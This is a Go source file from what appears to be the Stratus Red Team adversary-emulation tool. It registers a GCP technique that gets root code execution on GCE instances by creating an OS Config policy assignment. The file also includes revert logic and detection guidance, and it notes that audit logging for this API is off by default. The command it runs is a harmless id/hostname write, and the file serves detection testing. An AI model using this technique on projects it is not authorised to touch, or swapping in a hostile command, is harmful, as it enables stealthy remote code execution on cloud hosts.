package gcp

import (
	"context"
	_ "embed"
	"fmt"
	"log"
	"strings"
	"time"

	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
	osconfig "google.golang.org/api/osconfig/v1"
)

//go:embed main.tf
var tf []byte

// assignmentId is the fixed resource ID used for the OSPolicyAssignment created
// during detonation. Keeping it fixed allows revert to find and delete it without
// needing to track state across runs.
const assignmentId = "stratus-red-team-run-cmd"

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "gcp.execution.os-config-run-command",
		FriendlyName: "Execute Commands on GCE Instances via OS Config Agent",
		Description: `
Executes an arbitrary shell command on GCE instances by creating an OS Config
<code>OSPolicyAssignment</code>. The OS Config agent, which is pre-installed and
enabled on modern GCP images, polls for policy assignments and executes the
configured commands with root privileges. An attacker with
<code>osconfig.osPolicyAssignments.create</code> permission can abuse this
mechanism to achieve code execution on any instance in the project without
needing SSH access.

This is the GCP equivalent of AWS Systems Manager <code>SendCommand</code>.

Warm-up:

- Create a GCE instance (<code>e2-micro</code>, Debian 11) with the OS Config agent
  enabled via instance metadata (<code>enable-osconfig=TRUE</code>)

Detonation:

- Create an <code>OSPolicyAssignment</code> targeting instances labelled
  <code>stratus-red-team=true</code> that runs a shell command writing system
  information to <code>/tmp/stratus-output.txt</code>

Revert:

- Delete the <code>OSPolicyAssignment</code>

References:

- https://cloud.google.com/compute/docs/os-configuration-management
- https://cloud.google.com/compute/docs/osconfig/rest/v1/projects.locations.osPolicyAssignments
- https://blog.raphael.karger.is/articles/2022-08/GCP-OS-Patching
`,
		Detection: `
<b>Note:</b> GCP does not emit Admin Activity audit logs for the OS Config API
(<code>osconfig.googleapis.com</code>). <code>CreateOSPolicyAssignment</code> events
are only logged if Data Access audit logging is explicitly enabled for
<code>osconfig.googleapis.com</code> with log type <code>DATA_WRITE</code>, which is
not enabled by default.

When Data Access logging is enabled, identify when an <code>OSPolicyAssignment</code>
is created or modified by monitoring for
<code>google.cloud.osconfig.v1.OsConfigZonalService.CreateOSPolicyAssignment</code>
and <code>google.cloud.osconfig.v1.OsConfigZonalService.UpdateOSPolicyAssignment</code>
events. Alert on assignments whose policies include <code>Exec</code> resources with
<code>ENFORCEMENT</code> mode, especially when the instance filter targets a broad set
of instances.
`,
		Platform:                   stratus.GCP,
		IsIdempotent:               false,
		IsSlow:                     true,
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.Execution},
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
		Revert:                     revert,
	})
}

func newOSConfigService(ctx context.Context, providers stratus.CloudProviders) (*osconfig.Service, error) {
	svc, err := osconfig.NewService(ctx, providers.GCP().Options())
	if err != nil {
		return nil, fmt.Errorf("failed to create OS Config client: %w", err)
	}
	return svc, nil
}

func assignmentParent(projectId, zone string) string {
	return fmt.Sprintf("projects/%s/locations/%s", projectId, zone)
}

func assignmentName(projectId, zone string) string {
	return fmt.Sprintf("projects/%s/locations/%s/osPolicyAssignments/%s", projectId, zone, assignmentId)
}

// waitForOSConfigOperation polls an OS Config long-running operation until it completes.
// OSPolicyAssignment rollouts can take up to 10 minutes depending on instance count.
func waitForOSConfigOperation(ctx context.Context, svc *osconfig.Service, opName string) error {
	const maxAttempts = 60
	const pollInterval = 10 * time.Second

	for attempt := range maxAttempts {
		op, err := svc.Projects.Locations.OsPolicyAssignments.Operations.Get(opName).Context(ctx).Do()
		if err != nil {
			return fmt.Errorf("failed to poll OS Config operation %s: %w", opName, err)
		}
		if op.Done {
			if op.Error != nil {
				return fmt.Errorf("OS Config operation %s failed: %s", opName, op.Error.Message)
			}
			return nil
		}
		log.Printf("Waiting for OS Config operation to complete (attempt %d/%d)\n", attempt+1, maxAttempts)
		time.Sleep(pollInterval)
	}
	return fmt.Errorf("OS Config operation %s did not complete after %d attempts", opName, maxAttempts)
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	gcp := providers.GCP()
	projectId := gcp.GetProjectId()
	zone := params["zone"]
	ctx := context.Background()

	svc, err := newOSConfigService(ctx, providers)
	if err != nil {
		return err
	}

	parent := assignmentParent(projectId, zone)

	log.Printf("Creating OSPolicyAssignment %s in %s to run a shell command on targeted instances\n",
		assignmentId, parent)

	_, err = svc.Projects.Locations.OsPolicyAssignments.Create(
		parent,
		&osconfig.OSPolicyAssignment{
			// Target instances in the zone that carry the stratus-red-team label,
			// as applied by the Terraform warmup.
			InstanceFilter: &osconfig.OSPolicyAssignmentInstanceFilter{
				InclusionLabels: []*osconfig.OSPolicyAssignmentLabelSet{
					{
						Labels: map[string]string{"stratus-red-team": "true"},
					},
				},
			},
			OsPolicies: []*osconfig.OSPolicy{
				{
					Id:   "stratus-run-command",
					Mode: "ENFORCEMENT",
					ResourceGroups: []*osconfig.OSPolicyResourceGroup{
						{
							Resources: []*osconfig.OSPolicyResource{
								{
									Id: "run-command",
									Exec: &osconfig.OSPolicyResourceExecResource{
										// OS Config Exec resources use GCP-specific exit codes:
										// 100 = already compliant (skip enforce), 101 = not
										// compliant (run enforce). Exiting 101 ensures Enforce
										// always fires regardless of prior state.
										Validate: &osconfig.OSPolicyResourceExecResourceExec{
											Interpreter: "SHELL",
											Script:      "exit 101",
										},
										// Enforce writes system information to a file on disk,
										// producing observable evidence of remote execution.
										// Must exit 100 to signal enforcement succeeded.
										Enforce: &osconfig.OSPolicyResourceExecResourceExec{
											Interpreter: "SHELL",
											Script:      "echo \"id=$(id) hostname=$(hostname)\" > /tmp/stratus-output.txt; exit 100",
										},
									},
								},
							},
						},
					},
				},
			},
			Rollout: &osconfig.OSPolicyAssignmentRollout{
				// Apply to all targeted instances at once.
				DisruptionBudget: &osconfig.FixedOrPercent{Percent: 100},
				MinWaitDuration:  "0s",
			},
		},
	).OsPolicyAssignmentId(assignmentId).Context(ctx).Do()
	if err != nil {
		return fmt.Errorf("failed to create OSPolicyAssignment: %w", err)
	}

	// The CreateOSPolicyAssignment LRO tracks rollout to instances, which requires
	// instances to have internet access to phone home to the OS Config API. Rather
	// than wait for rollout completion (which may time out in restricted environments),
	// we verify the assignment was created by fetching it directly. The detection
	// signal is the CreateOSPolicyAssignment audit event, which fires on creation.
	name := assignmentName(projectId, zone)
	assignment, err := svc.Projects.Locations.OsPolicyAssignments.Get(name).Context(ctx).Do()
	if err != nil {
		return fmt.Errorf("OSPolicyAssignment creation could not be confirmed: %w", err)
	}
	log.Printf("OSPolicyAssignment %s created (rollout state: %s) — OS Config agents on targeted instances will execute the command on next poll\n",
		assignment.Name, assignment.RolloutState)
	return nil
}

// waitForRolloutComplete polls the OSPolicyAssignment until its rollout state
// is no longer IN_PROGRESS. GCP rejects Delete calls while a rollout is active.
func waitForRolloutComplete(ctx context.Context, svc *osconfig.Service, name string) error {
	const maxAttempts = 60
	const pollInterval = 10 * time.Second

	for attempt := range maxAttempts {
		assignment, err := svc.Projects.Locations.OsPolicyAssignments.Get(name).Context(ctx).Do()
		if err != nil {
			if strings.Contains(err.Error(), "404") {
				return nil
			}
			return fmt.Errorf("failed to get OSPolicyAssignment %s: %w", name, err)
		}
		if assignment.RolloutState != "IN_PROGRESS" {
			return nil
		}
		log.Printf("Waiting for rollout to complete before deleting (state: %s, attempt %d/%d)\n",
			assignment.RolloutState, attempt+1, maxAttempts)
		time.Sleep(pollInterval)
	}
	return fmt.Errorf("rollout for %s did not complete after %d attempts", name, maxAttempts)
}

func revert(params map[string]string, providers stratus.CloudProviders) error {
	gcp := providers.GCP()
	projectId := gcp.GetProjectId()
	zone := params["zone"]
	ctx := context.Background()

	svc, err := newOSConfigService(ctx, providers)
	if err != nil {
		return err
	}

	name := assignmentName(projectId, zone)

	// Wait for any in-progress rollout to finish — GCP rejects Delete while IN_PROGRESS.
	if err = waitForRolloutComplete(ctx, svc, name); err != nil {
		return err
	}

	log.Printf("Deleting OSPolicyAssignment %s\n", name)
	op, err := svc.Projects.Locations.OsPolicyAssignments.Delete(name).Context(ctx).Do()
	if err != nil {
		if strings.Contains(err.Error(), "404") {
			log.Printf("OSPolicyAssignment %s not found — already deleted\n", name)
			return nil
		}
		return fmt.Errorf("failed to delete OSPolicyAssignment %s: %w", name, err)
	}

	if err = waitForOSConfigOperation(ctx, svc, op.Name); err != nil {
		return err
	}

	log.Printf("Successfully deleted OSPolicyAssignment %s\n", name)
	return nil
}
